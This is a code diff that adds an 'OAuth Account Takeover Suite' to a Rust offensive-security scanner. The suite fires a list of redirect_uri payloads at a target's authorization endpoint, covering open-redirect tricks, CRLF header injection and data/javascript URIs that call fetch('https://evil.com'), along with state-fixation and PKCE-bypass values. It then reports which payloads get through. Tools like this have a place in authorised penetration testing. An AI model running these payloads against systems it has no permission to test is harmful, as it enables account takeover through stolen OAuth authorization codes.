@@ -266,3 +266,127 @@ pub async fn scope(
     println!("\n{} Scope escalation test complete.", "[*]".cyan().bold());
     Ok(())
 }
+
+const ATO_REDIRECT_PAYLOADS: &[(&str, &str)] = &[
+    ("Open redirect via path", "https://evil.com/redirect"),
+    ("Redirect via subdomain", "https://target.com.evil.com/callback"),
+    ("Redirect via @", "https://target.com@evil.com/callback"),
+    ("Redirect via #", "https://target.com#evil.com"),
+    ("Redirect via \\", "https://target.com\\@evil.com"),
+    ("Redirect via //", "https://target.com//evil.com"),
+    ("Redirect via path traversal", "https://target.com/../evil.com"),
+    ("Redirect via encoded @", "https://target.com%40evil.com"),
+    ("Redirect via encoded /", "https://target.com%2Fevil.com"),
+    ("Redirect via double encoded", "https://target.com%252F..%252Fevil.com"),
+    ("Redirect via CR", "https://target.com\r\nLocation: https://evil.com"),
+    ("Redirect via LF", "https://target.com\nLocation: https://evil.com"),
+    ("Redirect via null byte", "https://target.com\x00.evil.com"),
+    ("Redirect via authority", "https://evil.com:80@target.com/callback"),
+    ("Redirect via data URI", "data:text/html,<script>fetch('https://evil.com')</script>"),
+    ("Redirect via javascript", "javascript:fetch('https://evil.com')"),
+    ("State fixation — empty", ""),
+    ("State fixation — known", "fixed_state_12345"),
+    ("PKCE bypass — plain", "plain"),
+    ("PKCE bypass — empty verifier", ""),
+    ("PKCE bypass — short verifier", "abc"),
+    ("PKCE bypass — S256 mismatch", "sha256_of_different_value"),
+];
+
+pub async fn ato(auth_url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
+    println!("{} OAuth Account Takeover Suite", "[*]".cyan().bold());
+    println!("{}", "=".repeat(60).cyan());
+    println!("{} Auth URL: {}", "[*]".cyan().bold(), auth_url);
+    println!("{} {} ATO payloads", "[*]".cyan().bold(), ATO_REDIRECT_PAYLOADS.len());
+    println!("{}", "-".repeat(60).dimmed());
+
+    let client = build_client(timeout, token);
+    let mut results = Vec::new();
+
+    for (name, payload) in ATO_REDIRECT_PAYLOADS {
+        let test_url = if name.contains("State") || name.contains("PKCE") {
+            format!(
+                "{}&redirect_uri=https://target.com/callback&state={}&code_challenge_method=S256&code_challenge={}",
+                auth_url,
+                if payload.is_empty() { "test" } else { payload },
+                if payload.is_empty() { "test" } else { payload }
+            )
+        } else {
+            format!("{}&redirect_uri={}", auth_url, payload)
+        };
+
+        match client.get(&test_url).send().await {
+            Ok(resp) => {
+                let status = resp.status().as_u16();
+                let location = resp
+                    .headers()
+                    .get("location")
+                    .map(|v| v.to_str().unwrap_or(""))
+                    .unwrap_or("")
+                    .to_string();
+                let body = resp.text().await.unwrap_or_default();
+
+                let vulnerable = (!location.is_empty() && location.contains("evil.com"))
+                    || body.contains("evil.com")
+                    || (status == 302 && location.contains("code="))
+                    || (name.contains("State") && status != 400 && !body.contains("error"))
+                    || (name.contains("PKCE") && status != 400 && !body.contains("error"));
+
+                let tag = if vulnerable {
+                    "VULNERABLE".red().bold().to_string()
+                } else if status == 302 || status == 301 {
+                    "redirect".yellow().to_string()
+                } else if status == 400 || status == 401 {
+                    "blocked".green().to_string()
+                } else {
+                    format!("status {}", status)
+                };
+
+                println!(
+                    "  {} [{:02}] {:35} status={} {}",
+                    "*".cyan(),
+                    results.len() + 1,
+                    name,
+                    status,
+                    tag
+                );
+
+                if vulnerable {
+                    if !location.is_empty() {
+                        println!("    {} Location: {}", ">".red().bold(), location);
+                    }
+                    results.push(*name);
+                }
+            }
+            Err(_) => {
+                println!("  {} [{:02}] {:35} error", "*".red(), results.len() + 1, name);
+            }
+        }
+    }
+
+    println!(
+        "\n{} {} / {} ATO vectors vulnerable",
+        "[*]".cyan().bold(),
+        results.len(),
+        ATO_REDIRECT_PAYLOADS.len()
+    );
+
+    if !results.is_empty() {
+        let has_redirect = results.iter().any(|n| n.contains("Redirect"));
+        let has_state = results.iter().any(|n| n.contains("State"));
+        let has_pkce = results.iter().any(|n| n.contains("PKCE"));
+
+        if has_redirect {
+            println!("{} [CRITICAL] redirect_uri manipulation — full account takeover!", "[!]".red().bold());
+        }
+        if has_state {
+            println!("{} [HIGH] State fixation — CSRF protection bypass possible!", "[!]".red().bold());
+        }
+        if has_pkce {
+            println!("{} [HIGH] PKCE bypass — authorization code interception!", "[!]".red().bold());
+        }
+    } else {
+        println!("{} No ATO vulnerabilities detected.", "[-]".green().bold());
+    }
+
+    Ok(())
+}
